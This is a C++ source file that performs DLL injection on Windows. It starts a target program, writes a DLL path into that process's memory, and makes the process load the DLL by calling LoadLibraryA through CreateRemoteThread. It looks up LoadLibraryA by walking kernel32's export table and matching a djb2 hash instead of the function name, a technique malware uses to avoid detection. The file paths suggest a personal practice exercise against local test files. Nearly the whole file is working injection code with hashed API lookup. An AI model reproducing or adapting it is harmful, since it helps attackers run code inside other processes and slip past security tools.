// DLLinjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <winternl.h>
unsigned long hash_djb2(unsigned char* str) {
	unsigned long hash = 5381;
	int c;

	while (c = *str++)
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

	return hash;
}

DWORD Nemo_is_the_key(HMODULE DLL_module_adress, long Function_hash_name) {
	PIMAGE_DOS_HEADER p_Image_DOS = (PIMAGE_DOS_HEADER)DLL_module_adress;
	PIMAGE_NT_HEADERS32 p_Image_NT = (PIMAGE_NT_HEADERS32)((DWORD)DLL_module_adress + p_Image_DOS->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY Export_Directory_Address = (PIMAGE_EXPORT_DIRECTORY)((DWORD)DLL_module_adress + p_Image_NT->OptionalHeader.DataDirectory[0].VirtualAddress);
	DWORD Num_of_function = Export_Directory_Address->NumberOfFunctions;

	DWORD* Address_of_function = (DWORD*)((DWORD)DLL_module_adress + Export_Directory_Address->AddressOfFunctions);
	DWORD* Address_of_Name_function = (DWORD*)((DWORD)DLL_module_adress + Export_Directory_Address->AddressOfNames);
	//note , Address_of_ordinal_function need to defined as WORD becasue we need a array contain WORD (which is WORD)
	WORD* Address_of_ordinal_function = (WORD*)((DWORD)DLL_module_adress + Export_Directory_Address->AddressOfNameOrdinals);
	DWORD i = 1;
	while (i < Num_of_function)
	{	
		unsigned char* name = (unsigned char*)((DWORD)DLL_module_adress + Address_of_Name_function[i]);

		if (Function_hash_name == hash_djb2(name)) {	
			DWORD a = (DWORD)DLL_module_adress + Address_of_function[Address_of_ordinal_function[i]];
			return a;
		}
		i++;
	}
	return NULL;

}

int main()
{
	const char* ProcessPath = "E:\\tool\\code\\lastdance.exe";
	const char* DLL_Path = "E:\\tool\\code\\hello-world-x86.dll";
	LPSTARTUPINFOA Start_Up_Info = new STARTUPINFOA();
	PROCESS_BASIC_INFORMATION Basic_info = { 0 };
	PPROCESS_INFORMATION Process_info = new PROCESS_INFORMATION();

	LPVOID DLL_Mem_Location;
	

	CreateProcessA(ProcessPath, 0, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, Start_Up_Info, Process_info);
	
	//unsigned char* name = (unsigned char*)"LoadLibraryA";
	//long Function_name_hash = hash_djb2(name);

	ResumeThread(Process_info->hThread);

	DLL_Mem_Location = VirtualAllocEx(Process_info->hProcess, 0, strlen(DLL_Path), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(Process_info->hProcess, DLL_Mem_Location, DLL_Path, strlen(DLL_Path), 0);

	//Nemo_is_the_key(GetModuleHandle(TEXT("Kernel32.dll")), 0x5fbff0fb);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)Nemo_is_the_key(GetModuleHandle(TEXT("Kernel32.dll")), 0x5fbff0fb);
	CreateRemoteThread(Process_info->hProcess, NULL, 0, threatStartRoutineAddress, DLL_Mem_Location, 0, NULL);


	CloseHandle(Process_info->hProcess);
}
 
